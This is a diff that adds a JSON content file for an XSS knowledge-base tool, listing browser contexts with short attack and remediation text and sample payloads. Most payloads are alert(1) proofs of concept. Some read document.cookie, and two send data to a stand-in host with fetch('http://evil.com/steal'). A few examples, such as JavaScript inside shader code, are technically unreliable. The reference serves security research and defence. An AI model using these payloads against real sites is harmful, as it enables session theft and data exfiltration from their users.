@@ -1,0 +1,331 @@
+{
+  "app": {
+    "name": "BRS-KB XSS Knowledge Base",
+    "description": "Advanced XSS Intelligence Database for Researchers and Scanners",
+    "version": "Version",
+    "loading": "Loading...",
+    "error": "Error",
+    "success": "Success",
+    "warning": "Warning",
+    "info": "Information"
+  },
+  "navigation": {
+    "home": "Home",
+    "contexts": "Contexts",
+    "payloads": "Payloads",
+    "playground": "Playground",
+    "dashboard": "Dashboard",
+    "api_docs": "API Docs"
+  },
+  "contexts": {
+    "title": "XSS Vulnerability Contexts",
+    "description": "Explore different XSS vulnerability contexts with detailed attack vectors and remediation strategies.",
+    "severity": "Severity",
+    "cvss_score": "CVSS Score",
+    "description": "Description",
+    "attack_vector": "Attack Vector",
+    "remediation": "Remediation",
+    "examples": "Examples",
+    "payload_count": "Payload Count"
+  },
+  "context_details": {
+    "html_content": {
+      "title": "Cross-Site Scripting (XSS) in HTML Content",
+      "description": "User input is reflected directly into the HTML body without proper sanitization...",
+      "attack_vector": "CLASSIC ATTACK VECTORS:\n\n1. SCRIPT TAG INJECTION:\n   <script>alert(document.cookie)</script>...",
+      "remediation": "DEFENSE-IN-DEPTH STRATEGY:\n\n1. OUTPUT ENCODING (PRIMARY DEFENSE):\n   HTML Entity Encoding...",
+      "examples": [
+        {"name": "Basic Script", "payload": "<script>alert('XSS')</script>"},
+        {"name": "Image Error", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "websocket_xss": {
+      "title": "Cross-Site Scripting (XSS) in WebSocket Context",
+      "description": "WebSocket XSS occurs when user input is reflected into WebSocket messages...",
+      "attack_vector": "WEBSOCKET XSS ATTACK VECTORS:\n\n1. MESSAGE ECHO INJECTION:\n   Server-side code: ws.send(userMessage)...",
+      "remediation": "WEBSOCKET XSS DEFENSE STRATEGY:\n\n1. MESSAGE SANITIZATION:\n   Sanitize all outbound WebSocket messages...",
+      "examples": [
+        {"name": "Chat Message", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "Username", "payload": "{\"type\": \"user_joined\", \"username\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "service_worker_xss": {
+      "title": "Cross-Site Scripting (XSS) in Service Worker Context",
+      "description": "Service Worker XSS occurs when user input is reflected into Service Worker scripts...",
+      "attack_vector": "SERVICE WORKER XSS ATTACK VECTORS:\n\n1. DYNAMIC REGISTRATION INJECTION:\n   navigator.serviceWorker.register('/sw.js?user=' + USER_INPUT)...",
+      "remediation": "SERVICE WORKER XSS DEFENSE STRATEGY:\n\n1. SERVICE WORKER URL VALIDATION:\n   Validate Service Worker registration URLs...",
+      "examples": [
+        {"name": "Cache Injection", "payload": "data:text/javascript,self.addEventListener(\"install\",function(){fetch(\"http://evil.com/steal\")})"},
+        {"name": "Offline XSS", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "webrtc_xss": {
+      "title": "Cross-Site Scripting (XSS) in WebRTC Context",
+      "description": "WebRTC XSS occurs when user input is reflected in WebRTC data channels...",
+      "attack_vector": "WEBRTC XSS ATTACK VECTORS:\n\n1. DATA CHANNEL INJECTION:\n   WebRTC data channel: dataChannel.send(JSON.stringify({...",
+      "remediation": "WEBRTC XSS DEFENSE STRATEGY:\n\n1. DATA CHANNEL VALIDATION:\n   Validate data channel messages...",
+      "examples": [
+        {"name": "Chat Message", "payload": "{\"type\": \"chat\", \"message\": \"<script>alert(1)</script>\"}"},
+        {"name": "Peer Info", "payload": "{\"type\": \"peer_info\", \"name\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "graphql_xss": {
+      "title": "Cross-Site Scripting (XSS) in GraphQL Context",
+      "description": "GraphQL XSS occurs when user input is reflected in GraphQL queries...",
+      "attack_vector": "GRAPHQL XSS ATTACK VECTORS:\n\n1. QUERY PARAMETER INJECTION:\n   query GetUser($id: ID!) { user(id: $id) {...",
+      "remediation": "GRAPHQL XSS DEFENSE STRATEGY:\n\n1. INPUT VALIDATION:\n   Validate all GraphQL inputs...",
+      "examples": [
+        {"name": "GraphQL Query", "payload": "query { user(id: \"<script>alert(1)</script>\") { name } }"},
+        {"name": "GraphQL Mutation", "payload": "mutation { updateProfile(input: { displayName: \"<script>alert(1)</script>\" }) { success } }"}
+      ]
+    },
+    "shadow_dom_xss": {
+      "title": "Cross-Site Scripting (XSS) in Shadow DOM Context",
+      "description": "Shadow DOM XSS occurs when user input is reflected in Shadow DOM elements...",
+      "attack_vector": "SHADOW DOM XSS ATTACK VECTORS:\n\n1. SLOT CONTENT INJECTION:\n   <user-profile><span slot=\"name\">USER_INPUT</span></user-profile>",
+      "remediation": "SHADOW DOM XSS DEFENSE STRATEGY:\n\n1. CONTENT SANITIZATION:\n   Sanitize all content before inserting into Shadow DOM...",
+      "examples": [
+        {"name": "Shadow DOM Slot", "payload": "<span slot=\"content\"><script>alert(1)</script></span>"},
+        {"name": "Shadow DOM Attribute", "payload": "<my-component title=\"<script>alert(1)</script>\"></my-component>"}
+      ]
+    },
+    "custom_elements_xss": {
+      "title": "Cross-Site Scripting (XSS) in Custom Elements Context",
+      "description": "Custom Elements XSS occurs when user input is reflected in custom element definitions...",
+      "attack_vector": "CUSTOM ELEMENTS XSS ATTACK VECTORS:\n\n1. ELEMENT NAME INJECTION:\n   customElements.define(USER_INPUT, MyComponent)...",
+      "remediation": "CUSTOM ELEMENTS XSS DEFENSE STRATEGY:\n\n1. ELEMENT NAME VALIDATION:\n   Validate custom element names...",
+      "examples": [
+        {"name": "Element Name", "payload": "<script>alert(1)</script>"},
+        {"name": "Element Attribute", "payload": "<my-component data-value='<script>alert(1)</script>'></my-component>"}
+      ]
+    },
+    "http2_push_xss": {
+      "title": "Cross-Site Scripting (XSS) in HTTP/2 Push Context",
+      "description": "HTTP/2 Push XSS occurs when user input is reflected in HTTP/2 push resources...",
+      "attack_vector": "HTTP/2 PUSH XSS ATTACK VECTORS:\n\n1. PUSH PATH INJECTION:\n   server.push('/api/user/' + USER_INPUT)...",
+      "remediation": "HTTP/2 PUSH XSS DEFENSE STRATEGY:\n\n1. PUSH PATH VALIDATION:\n   Validate all push paths...",
+      "examples": [
+        {"name": "Push Path", "payload": "/api/user/<script>alert(1)</script>"},
+        {"name": "Push Content", "payload": "var userName = \"<script>alert(1)</script>\";"}
+      ]
+    },
+    "iframe_sandbox_xss": {
+      "title": "Cross-Site Scripting (XSS) via iframe Sandbox Bypass",
+      "description": "iframe Sandbox XSS occurs when sandbox restrictions are bypassed...",
+      "attack_vector": "IFRAME SANDBOX XSS ATTACK VECTORS:\n\n1. INCOMPLETE SANDBOX:\n   <iframe src=\"USER_CONTENT\" sandbox=\"allow-scripts\"></iframe>...",
+      "remediation": "IFRAME SANDBOX XSS DEFENSE STRATEGY:\n\n1. STRICT SANDBOX:\n   Use strict sandbox policy...",
+      "examples": [
+        {"name": "Data URI", "payload": "<iframe src='data:text/html,<script>alert(1)</script>' sandbox='allow-scripts'></iframe>"},
+        {"name": "Same Origin", "payload": "<iframe src='/same-origin' sandbox='allow-same-origin allow-scripts'></iframe>"}
+      ]
+    },
+    "indexeddb_xss": {
+      "title": "Cross-Site Scripting (XSS) in IndexedDB Context",
+      "description": "IndexedDB XSS occurs when user input is reflected in IndexedDB storage...",
+      "attack_vector": "INDEXEDDB XSS ATTACK VECTORS:\n\n1. STORAGE INJECTION:\n   store.add({id: userId, name: USER_INPUT})...",
+      "remediation": "INDEXEDDB XSS DEFENSE STRATEGY:\n\n1. STORAGE SANITIZATION:\n   Sanitize all data before storage...",
+      "examples": [
+        {"name": "User Profile", "payload": "{\"name\": \"<script>alert(1)</script>\", \"email\": \"test@example.com\"}"},
+        {"name": "Message Storage", "payload": "{\"content\": \"<script>alert(1)</script>\", \"type\": \"text\"}"}
+      ]
+    },
+    "webgl_xss": {
+      "title": "Cross-Site Scripting (XSS) in WebGL Context",
+      "description": "WebGL XSS occurs when user input is reflected in WebGL shaders...",
+      "attack_vector": "WEBGL XSS ATTACK VECTORS:\n\n1. SHADER INJECTION:\n   const vertexShaderSource = 'attribute vec4 aVertexPosition; ' + USER_INPUT...",
+      "remediation": "WEBGL XSS DEFENSE STRATEGY:\n\n1. SHADER VALIDATION:\n   Validate all shader code...",
+      "examples": [
+        {"name": "Vertex Shader", "payload": "gl_Position = uModelViewMatrix * aVertexPosition; alert(1);"},
+        {"name": "Fragment Shader", "payload": "gl_FragColor = vec4(0.0, 1.0, 0.0, 1.0); fetch('http://evil.com/steal')"}
+      ]
+    },
+    "css_context": {
+      "title": "Cross-Site Scripting (XSS) in CSS Context",
+      "description": "CSS XSS occurs when user input is reflected in CSS styles...",
+      "attack_vector": "CSS XSS ATTACK VECTORS:\n\n1. CSS EXPRESSION:\n   expression(alert(1))...",
+      "remediation": "CSS XSS DEFENSE STRATEGY:\n\n1. CSS VALIDATION:\n   Validate all CSS properties...",
+      "examples": [
+        {"name": "CSS Expression", "payload": "expression(alert(1))"},
+        {"name": "CSS URL", "payload": "background:url('javascript:alert(1)')"}
+      ]
+    },
+    "svg_context": {
+      "title": "Cross-Site Scripting (XSS) in SVG Context",
+      "description": "SVG XSS occurs when user input is reflected in SVG elements...",
+      "attack_vector": "SVG XSS ATTACK VECTORS:\n\n1. SVG ONLOAD:\n   <svg onload=alert(1)>...",
+      "remediation": "SVG XSS DEFENSE STRATEGY:\n\n1. SVG SANITIZATION:\n   Sanitize all SVG elements...",
+      "examples": [
+        {"name": "SVG Onload", "payload": "<svg onload=alert(1)>"},
+        {"name": "SVG Script", "payload": "<svg><script>alert(1)</script></svg>"}
+      ]
+    },
+    "markdown_context": {
+      "title": "Cross-Site Scripting (XSS) in Markdown Context",
+      "description": "Markdown XSS occurs when user input is reflected in Markdown rendering...",
+      "attack_vector": "MARKDOWN XSS ATTACK VECTORS:\n\n1. MARKDOWN LINK:\n   [XSS](javascript:alert(1))...",
+      "remediation": "MARKDOWN XSS DEFENSE STRATEGY:\n\n1. MARKDOWN SANITIZATION:\n   Sanitize all Markdown elements...",
+      "examples": [
+        {"name": "Markdown Link", "payload": "[XSS](javascript:alert(1))"},
+        {"name": "Markdown Image", "payload": "![XSS](javascript:alert(1))"}
+      ]
+    },
+    "json_value": {
+      "title": "Cross-Site Scripting (XSS) in JSON Context",
+      "description": "JSON XSS occurs when user input is reflected in JSON data...",
+      "attack_vector": "JSON XSS ATTACK VECTORS:\n\n1. JSON INJECTION:\n   {\"user\": \"<script>alert(1)</script>\"}...",
+      "remediation": "JSON XSS DEFENSE STRATEGY:\n\n1. JSON VALIDATION:\n   Validate all JSON data...",
+      "examples": [
+        {"name": "JSON Value", "payload": "{\"user\": \"<script>alert(1)</script>\"}"},
+        {"name": "JSON Object", "payload": "{\"data\": \"<script>alert(1)</script>\"}"}
+      ]
+    },
+    "xml_content": {
+      "title": "Cross-Site Scripting (XSS) in XML Context",
+      "description": "XML XSS occurs when user input is reflected in XML data...",
+      "attack_vector": "XML XSS ATTACK VECTORS:\n\n1. XML INJECTION:\n   <user><name><script>alert(1)</script></name></user>...",
+      "remediation": "XML XSS DEFENSE STRATEGY:\n\n1. XML SANITIZATION:\n   Sanitize all XML elements...",
+      "examples": [
+        {"name": "XML Content", "payload": "<user><name><script>alert(1)</script></name></user>"},
+        {"name": "XML CDATA", "payload": "<content><![CDATA[<script>alert(1)</script>]]></content>"}
+      ]
+    },
+    "url_context": {
+      "title": "Cross-Site Scripting (XSS) in URL Context",
+      "description": "URL XSS occurs when user input is reflected in URLs...",
+      "attack_vector": "URL XSS ATTACK VECTORS:\n\n1. JAVASCRIPT PROTOCOL:\n   javascript:alert(1)...",
+      "remediation": "URL XSS DEFENSE STRATEGY:\n\n1. URL VALIDATION:\n   Validate all URL parameters...",
+      "examples": [
+        {"name": "JavaScript Protocol", "payload": "javascript:alert(1)"},
+        {"name": "Data URI", "payload": "data:text/html,<script>alert(1)</script>"}
+      ]
+    },
+    "dom_xss": {
+      "title": "DOM-based Cross-Site Scripting (DOM XSS)",
+      "description": "DOM-based XSS occurs when user input is reflected in DOM manipulations...",
+      "attack_vector": "DOM XSS ATTACK VECTORS:\n\n1. LOCATION SOURCES:\n   location.hash, location.search, location.pathname...",
+      "remediation": "DOM XSS DEFENSE STRATEGY:\n\n1. SAFE DOM APIS:\n   Use safe DOM manipulation methods...",
+      "examples": [
+        {"name": "Location Hash", "payload": "location.hash"},
+        {"name": "Document Referrer", "payload": "document.referrer"}
+      ]
+    },
+    "template_injection": {
+      "title": "Client-Side Template Injection Leading to XSS",
+      "description": "Client-Side Template Injection occurs when user input is embedded into client-side templates...",
+      "attack_vector": "TEMPLATE INJECTION ATTACK VECTORS:\n\n1. TEMPLATE SANDBOX ESCAPE:\n   Template engines with sandbox bypass...",
+      "remediation": "TEMPLATE INJECTION DEFENSE:\n\n1. TEMPLATE SANDBOXING:\n   Use sandboxed template compilation...",
+      "examples": [
+        {"name": "Angular Template", "payload": "{{constructor.constructor('alert(1)')()}}"},
+        {"name": "Vue Template", "payload": "{{7*7}}"}
+      ]
+    },
+    "postmessage_xss": {
+      "title": "PostMessage API XSS Vulnerabilities",
+      "description": "PostMessage XSS occurs when user input is reflected in PostMessage API communications...",
+      "attack_vector": "POSTMESSAGE XSS ATTACK VECTORS:\n\n1. MESSAGE DATA INJECTION:\n   postMessage(userInput, origin)...",
+      "remediation": "POSTMESSAGE XSS DEFENSE:\n\n1. MESSAGE VALIDATION:\n   Validate all PostMessage data...",
+      "examples": [
+        {"name": "Message Data", "payload": "{\"type\": \"message\", \"data\": \"<script>alert(1)</script>\"}"},
+        {"name": "Message Source", "payload": "{\"source\": \"javascript:alert(1)\", \"data\": \"message\"}"}
+      ]
+    },
+    "wasm_context": {
+      "title": "WebAssembly Context XSS",
+      "description": "WebAssembly XSS occurs when user input is reflected in WebAssembly code...",
+      "attack_vector": "WASM XSS ATTACK VECTORS:\n\n1. WASM CODE INJECTION:\n   WebAssembly module manipulation...",
+      "remediation": "WASM XSS DEFENSE:\n\n1. WASM VALIDATION:\n   Validate all WebAssembly code...",
+      "examples": [
+        {"name": "WASM Import", "payload": "(import \"env\" \"alert\" (func $alert))"},
+        {"name": "WASM Export", "payload": "(export \"xss\" (func $xss))"}
+      ]
+    },
+    "html_attribute": {
+      "title": "Cross-Site Scripting (XSS) in HTML Attributes",
+      "description": "HTML Attribute XSS occurs when user input is reflected in HTML tag attributes...",
+      "attack_vector": "HTML ATTRIBUTE XSS ATTACK VECTORS:\n\n1. ATTRIBUTE INJECTION:\n   <div data-text=\"USER_INPUT\">...</div>...",
+      "remediation": "HTML ATTRIBUTE XSS DEFENSE STRATEGY:\n\n1. ATTRIBUTE ENCODING:\n   Encode all HTML attributes...",
+      "examples": [
+        {"name": "Attribute Breakout", "payload": "\"><script>alert(1)</script>"},
+        {"name": "Image Onerror", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    },
+    "html_comment": {
+      "title": "Cross-Site Scripting (XSS) in HTML Comments",
+      "description": "HTML Comment XSS occurs when user input is reflected in HTML comments...",
+      "attack_vector": "HTML COMMENT XSS ATTACK VECTORS:\n\n1. COMMENT BREAKOUT:\n   <!-- USER_INPUT -->...",
+      "remediation": "HTML COMMENT XSS DEFENSE STRATEGY:\n\n1. COMMENT SANITIZATION:\n   Sanitize all HTML comments...",
+      "examples": [
+        {"name": "Comment Breakout", "payload": "--><script>alert(1)</script><!--"},
+        {"name": "Conditional Comment", "payload": "<!--[if IE]><script>alert(1)</script><![endif]-->"}
+      ]
+    },
+    "javascript_context": {
+      "title": "Cross-Site Scripting (XSS) in JavaScript Context",
+      "description": "JavaScript Context XSS occurs when user input is injected directly into JavaScript code...",
+      "attack_vector": "JAVASCRIPT CONTEXT XSS ATTACK VECTORS:\n\n1. VARIABLE INJECTION:\n   var data = USER_INPUT;...",
+      "remediation": "JAVASCRIPT CONTEXT XSS DEFENSE STRATEGY:\n\n1. JSON SERIALIZATION:\n   Use JSON serialization for JavaScript variables...",
+      "examples": [
+        {"name": "Variable Injection", "payload": "1; alert(document.cookie); var x=1"},
+        {"name": "Function Injection", "payload": "1); alert(1); doSomething(1"}
+      ]
+    },
+    "js_string": {
+      "title": "Cross-Site Scripting (XSS) in JavaScript String Context",
+      "description": "JavaScript String XSS occurs when user input is reflected in JavaScript strings...",
+      "attack_vector": "JS STRING XSS ATTACK VECTORS:\n\n1. STRING CONCATENATION:\n   var message = 'Hello ' + USER_INPUT...",
+      "remediation": "JS STRING XSS DEFENSE STRATEGY:\n\n1. STRING ENCODING:\n   Encode all JavaScript strings...",
+      "examples": [
+        {"name": "String Concatenation", "payload": "' + alert(1) + '"},
+        {"name": "Template Literal", "payload": "`${alert(1)}`"}
+      ]
+    },
+    "js_object": {
+      "title": "Cross-Site Scripting (XSS) in JavaScript Object Context",
+      "description": "JavaScript Object XSS occurs when user input is reflected in JavaScript objects...",
+      "attack_vector": "JS OBJECT XSS ATTACK VECTORS:\n\n1. OBJECT PROPERTY INJECTION:\n   var config = {value: USER_INPUT}...",
+      "remediation": "JS OBJECT XSS DEFENSE STRATEGY:\n\n1. OBJECT VALIDATION:\n   Validate all object properties...",
+      "examples": [
+        {"name": "Object Property", "payload": "1, alert: alert(1), real: 1"},
+        {"name": "Object Injection", "payload": "null}; alert(1); var config = {value: null"}
+      ]
+    },
+    "default": {
+      "title": "Generic XSS Information",
+      "description": "General information about Cross-Site Scripting vulnerabilities...",
+      "attack_vector": "GENERAL XSS ATTACK VECTORS:\n\n1. SCRIPT INJECTION:\n   <script>alert('XSS')</script>...",
+      "remediation": "GENERAL XSS DEFENSE STRATEGY:\n\n1. INPUT VALIDATION:\n   Validate all input data...",
+      "examples": [
+        {"name": "Basic XSS", "payload": "<script>alert('XSS')</script>"},
+        {"name": "Image XSS", "payload": "<img src=x onerror=alert(1)>"}
+      ]
+    }
+  },
+  "common": {
+    "loading": "Loading...",
+    "error": "Error",
+    "success": "Success",
+    "warning": "Warning",
+    "info": "Information",
+    "search": "Search",
+    "filter": "Filter",
+    "clear": "Clear",
+    "export": "Export",
+    "import": "Import",
+    "save": "Save",
+    "cancel": "Cancel",
+    "confirm": "Confirm",
+    "yes": "Yes",
+    "no": "No",
+    "total": "Total",
+    "contexts": "Contexts",
+    "payloads": "Payloads",
+    "severity": "Severity",
+    "cvss_score": "CVSS Score",
+    "description": "Description",
+    "attack_vector": "Attack Vector",
+    "remediation": "Remediation",
+    "examples": "Examples",
+    "payload_count": "Payload Count"
+  }
+}
+
